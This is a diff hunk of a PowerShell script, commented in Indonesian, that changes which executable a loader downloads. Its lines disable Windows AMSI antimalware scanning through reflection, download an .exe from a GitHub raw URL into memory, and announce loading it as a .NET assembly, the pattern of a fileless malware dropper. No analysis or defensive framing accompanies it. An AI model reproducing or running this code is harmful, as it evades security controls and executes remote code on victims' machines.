@@ -2,7 +2,7 @@
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # Download file .exe ke memory
-$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/noobs.exe'
+$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/Ewnuyduy.exe'
 $bytes = (New-Object Net.WebClient).DownloadData($url)
 
 # Load .NET assembly dari memory
